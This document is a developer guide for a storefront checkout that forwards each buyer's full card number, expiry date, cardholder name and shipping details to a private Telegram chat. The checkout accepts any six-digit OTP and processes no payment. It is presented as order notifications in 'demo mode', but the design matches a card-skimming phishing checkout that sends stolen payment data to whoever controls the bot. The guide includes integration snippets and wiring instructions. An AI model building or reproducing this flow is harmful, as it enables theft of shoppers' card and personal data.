# Implementation Guide - Telegram Checkout Notifications

## Overview

This guide explains how the Telegram checkout notification system works and how to integrate it into your checkout flow.

## System Architecture

```
User Fills Shipping Form
        ↓
    [Stored in State]
        ↓
User Fills Payment Form
        ↓
    [Stored in State]
        ↓
User Clicks "Continue to Verification"
        ↓
OTP Verification Completed
        ↓
Combined Data Sent → Telegram Bot → Your Telegram Chat
        ↓
Success/Confirmation
```

## Files Created/Modified

### 1. **`.env` - Configuration**
```env
VITE_TELEGRAM_BOT_TOKEN="your_telegram_bot_token_here"
VITE_TELEGRAM_CHAT_ID="your_telegram_chat_id_here"
```

### 2. **`src/lib/telegram-notifier.ts`** (NEW)
Core utility that handles Telegram API communication:
- `sendCheckoutDataToTelegram()` - Main function to send data
- `formatCheckoutMessage()` - Formats data into readable Telegram message
- Type definitions for CheckoutData interface

**Usage:**
```typescript
import { sendCheckoutDataToTelegram } from '@/lib/telegram-notifier';

const success = await sendCheckoutDataToTelegram({
  shippingDetails: {...},
  paymentDetails: {...},
  orderInfo: {...}
});
```

### 3. **`src/components/checkout/CheckoutFormWithTelegram.tsx`** (NEW)
Wrapper component that integrates Telegram notifications with payment flow:
- Manages payment data capture
- Triggers Telegram notification on successful OTP verification
- Maintains backward compatibility with existing PaymentForm

**Usage in Checkout.tsx:**
```typescript
<CheckoutFormWithTelegram
  amount={calculateTotal()}
  currency="USD"
  orderId={orderId}
  productName={product.title}
  quantity={quantity}
  shippingDetails={shippingFormData}
  onSuccess={handlePaymentSuccess}
  onCancel={() => setStep('details')}
/>
```

### 4. **`src/components/payment/PaymentForm.tsx`** (MODIFIED)
Enhanced with:
- New prop: `onPaymentDataCaptured` - callback to capture payment data
- Calls the callback when OTP is verified successfully
- Exports payment details (cardholderName, cardNumber, cardBrand, expiryMonth, expiryYear)

**New Capability:**
```typescript
const handlePaymentSuccess = async (transactionId: string) => {
  // Now receives payment data from PaymentForm
  const checkoutData = {
    shippingDetails,
    paymentDetails, // Received from onPaymentDataCaptured callback
    orderInfo: { orderId, productName, quantity, amount, currency }
  };
  
  await sendCheckoutDataToTelegram(checkoutData);
};
```

### 5. **`src/pages/Checkout.tsx`** (MODIFIED)
Updates include:
- Import `sendCheckoutDataToTelegram`
- New state: `checkoutData` to store combined data
- Ready for integration with CheckoutFormWithTelegram

## Data Flow Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                    Checkout Page                             │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  Step 1: Shipping Details                                    │
│  ┌──────────────────────────────────────────────────────┐   │
│  │ Full Name, Email, Phone, Address, City, Country     │   │
│  │ → Stored in component state                         │   │
│  └──────────────────────────────────────────────────────┘   │
│                    ↓                                          │
│  Step 2: Payment Details                                     │
│  ┌──────────────────────────────────────────────────────┐   │
│  │ Card Number, Expiry, CVV, Cardholder Name          │   │
│  │ → Stored in PaymentForm state                       │   │
│  └──────────────────────────────────────────────────────┘   │
│                    ↓                                          │
│  Step 3: OTP Verification                                    │
│  ┌──────────────────────────────────────────────────────┐   │
│  │ User enters 6-digit OTP                             │   │
│  │ → handleOTPVerified() is called                     │   │
│  │ → onPaymentDataCaptured callback fires              │   │
│  └──────────────────────────────────────────────────────┘   │
│                    ↓                                          │
│  Combine & Send                                              │
│  ┌──────────────────────────────────────────────────────┐   │
│  │ Merge shipping + payment + order data               │   │
│  │ → Call sendCheckoutDataToTelegram()                 │   │
│  │ → Format message with HTML markup                   │   │
│  │ → Send via Telegram Bot API                         │   │
│  └──────────────────────────────────────────────────────┘   │
│                    ↓                                          │
│  Notification Received                                       │
│  ┌──────────────────────────────────────────────────────┐   │
│  │ Your Telegram receives formatted message            │   │
│  │ with all checkout details                           │   │
│  └──────────────────────────────────────────────────────┘   │
│                                                               │
└─────────────────────────────────────────────────────────────┘
```

## Integration Steps (For Existing Checkout Flow)

### Option A: Use CheckoutFormWithTelegram Wrapper (Recommended)

In `Checkout.tsx`, replace the PaymentForm with CheckoutFormWithTelegram:

```typescript
// Before:
<PaymentForm
  amount={calculateTotal()}
  currency="USD"
  orderId={orderId}
  productName={product.title}
  quantity={quantity}
  onSuccess={handlePaymentSuccess}
  onCancel={() => setStep('details')}
/>

// After:
<CheckoutFormWithTelegram
  amount={calculateTotal()}
  currency="USD"
  orderId={orderId}
  productName={product.title}
  quantity={quantity}
  shippingDetails={shippingFormData}
  onSuccess={handlePaymentSuccess}
  onCancel={() => setStep('details')}
/>
```

### Option B: Manual Integration with PaymentForm

If you want to use PaymentForm directly:

```typescript
const [shippingDetails, setShippingDetails] = useState({...});
const [paymentData, setPaymentData] = useState(null);

<PaymentForm
  amount={calculateTotal()}
  onSuccess={async (transactionId) => {
    if (paymentData) {
      await sendCheckoutDataToTelegram({
        shippingDetails,
        paymentDetails: paymentData,
        orderInfo: { orderId, productName, quantity, amount, currency }
      });
    }
    handlePaymentSuccess(transactionId);
  }}
  onPaymentDataCaptured={setPaymentData}
/>
```

## Configuration

### Required Environment Variables

Add these to `.env`:

```env
# Telegram Bot Credentials
VITE_TELEGRAM_BOT_TOKEN="<your_bot_token_from_botfather>"
VITE_TELEGRAM_CHAT_ID="<your_chat_id>"
```

### Optional: Customize Message Format

To change the Telegram message format, modify `formatCheckoutMessage()` in `src/lib/telegram-notifier.ts`:

```typescript
function formatCheckoutMessage(data: CheckoutData): string {
  let message = `🛒 <b>CUSTOM HEADER</b>\n`;
  // ... customize the message structure
  return message;
}
```

## Data Security

⚠️ **Current Implementation Notes:**
- This is a **demo mode** system
- Full card numbers are sent for development visibility
- For production, mask card numbers:

```typescript
// Example: Mask card number
const maskedCard = `••••••••••••${cardLastFour}`;
```

## Error Handling

The system includes built-in error handling:

```typescript
// In sendCheckoutDataToTelegram()
if (!botToken || !chatId) {
  console.error('Telegram credentials not configured in .env');
  return false; // Gracefully handles missing credentials
}

try {
  // API call...
  return result.ok;
} catch (error) {
  console.error('Error sending to Telegram:', error);
  return false; // Doesn't block user experience
}
```

**Important:** Even if Telegram notification fails, the checkout process continues. The notification is non-blocking.

## Testing Checklist

- [ ] .env configured with valid BOT_TOKEN and CHAT_ID
- [ ] Dev server restarted after .env changes
- [ ] Telegram bot receives test message when you send `/start`
- [ ] Filled shipping form completely
- [ ] Filled payment form with valid test data
- [ ] Successfully entered OTP (any 6 digits)
- [ ] Received formatted message in Telegram
- [ ] Message contains all shipping details
- [ ] Message contains masked/full payment details
- [ ] Message includes order info and timestamp

## Debugging

### Check Telegram Bot Status
```bash
curl https://api.telegram.org/bot<TOKEN>/getMe
```

### Check for Recent Messages
```bash
curl https://api.telegram.org/bot<TOKEN>/getUpdates
```

### Browser Console Logs
- Open DevTools (F12)
- Go to Console tab
- Look for "✅ Checkout data sent to Telegram successfully" or error logs
- Check for Telegram API responses in Network tab

## API Response Examples

### Success Response
```json
{
  "ok": true,
  "result": {
    "message_id": 12345,
    "date": 1674123456,
    "text": "🛒 NEW CHECKOUT NOTIFICATION..."
  }
}
```

### Error Response
```json
{
  "ok": false,
  "error_code": 400,
  "description": "Bad Request: chat not found"
}
```

## Limitations & Future Enhancements

### Current Limitations
- Requires valid Telegram Bot Token
- Sends to single chat ID only
- Text-only messages (no media)
- Demo mode - no payment processing

### Potential Enhancements
- [ ] Multiple recipient support
- [ ] Rich media (images, attachments)
- [ ] Webhook integration for order status updates
- [ ] Encrypted sensitive data transmission
- [ ] Production-ready PCI compliance
- [ ] Database logging of sent notifications
- [ ] Retry mechanism for failed sends
- [ ] Admin dashboard to manage notifications

## Support & Resources

- **Telegram Bot API**: https://core.telegram.org/bots/api
- **BotFather**: https://t.me/botfather
- **Error Codes**: https://core.telegram.org/bots/api#responsebody

---

## Quick Reference

| Component | Purpose | Location |
|-----------|---------|----------|
| telegram-notifier.ts | API calls & formatting | `src/lib/` |
| CheckoutFormWithTelegram | Integration wrapper | `src/components/checkout/` |
| PaymentForm | Enhanced with data capture | `src/components/payment/` |
| Checkout page | Uses wrapper component | `src/pages/` |
| .env | Configuration | Project root |

